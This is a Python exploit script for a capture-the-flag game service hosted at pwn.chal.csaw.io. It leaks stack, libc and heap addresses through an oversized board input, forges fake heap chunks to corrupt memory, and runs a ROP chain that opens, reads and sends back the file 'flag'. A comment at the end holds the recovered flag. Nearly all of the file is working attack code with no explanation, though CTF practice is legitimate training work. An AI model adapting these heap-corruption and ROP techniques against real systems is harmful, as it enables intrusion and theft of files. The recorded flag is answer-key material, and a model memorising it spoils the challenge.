import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

# ipaddr = ("10.0.0.97", 31337)
ipaddr = ("pwn.chal.csaw.io", 7478)

sc = socket.create_connection(ipaddr)

read_until(sc, "3) Q (Quit)\n")
sc.send("n\n")
read_until(sc, "3) Quit game (Q)\n")
sc.send("v\n")

mem = ""
for i in xrange(25):
    mem += readline(sc, False)
# print repr(mem)
# print mem.encode("hex")

some_stack_addr = struct.unpack("<I", mem[20*4+1:20*4+5])[0]
print "stack", hex(some_stack_addr)

some_libc_addr = struct.unpack("<I", mem[21*4+1:21*4+5])[0]
print "libc", hex(some_libc_addr)

sc.send("q\n")

x = 2
y = 4

read_until(sc, "3) Q (Quit)\n")
sc.send("i\n")

read_until(sc, "Please enter in the dimensions of the board you would like to set in this format: B X Y\n")
sc.send("b %d %d\n" % (x, y))

read_until(sc, "marked by the character X\n")
sc.send("X" * (x*y+1))

read_until(sc, "3) Q (Quit)\n")
sc.send("n\n")

read_until(sc, "3) Quit game (Q)\n")
sc.send("v\n")


mem = ""
for i in xrange(16):
    mem += readline(sc, False)
# print repr(mem)
# print mem.encode("hex")
heapbase = struct.unpack("<I", mem[16:20])[0] - 0xf0
print "heapbase", hex(heapbase)
sc.close()

sc = socket.create_connection(ipaddr)

pos = some_stack_addr + 0x89

x = 53 + 1
y = 53 + 1

realchunk = "X" * 0xeb * 12 + I(0x12) + I(heapbase + 0x18) + I(heapbase)
realchunk = realchunk.ljust(x*y+1, "Z")

print read_until(sc, "3) Q (Quit)\n")
sc.send("i\n")

print read_until(sc, "Please enter in the dimensions of the board you would like to set in this format: B X Y\n")
sc.send("b %d %d\n" % (x, y))

print read_until(sc, "marked by the character X\n")
sc.send(realchunk)

x = 54 + 1
y = 54 + 1

fakechunk = "X" * 0xf3 * 12 + I(0x61) + I(pos) + I(0x55555555)
fakechunk = fakechunk.ljust(x*y+1, "Z")

print read_until(sc, "3) Q (Quit)\n")
sc.send("i\n")

print read_until(sc, "Please enter in the dimensions of the board you would like to set in this format: B X Y\n")
sc.send("b %d %d\n" % (x, y))

print read_until(sc, "marked by the character X\n")
sc.send(fakechunk)

x = 34 + 1
y = 35 + 1

rop_open = 0x080486D0
rop_read = 0x08048630
rop_pop2 = 0x08049E2E
rop_pop3 = 0x08049E2D
rop_send_string = 0x08049B3C

fakechunk = ""
fakechunk = fakechunk.ljust(28, "X")
fakechunk += I(rop_open) + I(rop_pop2) + I(pos+0x200+12) + I(0)
fakechunk += I(rop_read) + I(rop_pop3) + I(3) + I(pos+0x300) + I(100)
fakechunk += I(rop_send_string) + I(0x11111111) + I(4) + I(pos+0x300)
fakechunk = fakechunk.ljust(0x200, "X")
fakechunk += "flag\x00"

fakechunk = fakechunk.ljust(0x64 * 12, "X")
fakechunk += I(1) + I(0x0804bdc8) + I(0x0804bdc8)
print len(fakechunk)
fakechunk = fakechunk.ljust(x*y+1, "Z")
print len(fakechunk)

print read_until(sc, "3) Q (Quit)\n")
sc.send("i\n")

print read_until(sc, "Please enter in the dimensions of the board you would like to set in this format: B X Y\n")
sc.send("b %d %d\n" % (x, y))

print read_until(sc, "marked by the character X\n")
sc.send(fakechunk)

print read_until(sc, "3) Q (Quit)\n")
sc.send("q\n")

# t = telnetlib.Telnet()                                                  
# t.sock = sc
# t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    
# flag{h3aps4r3fun351eabf3}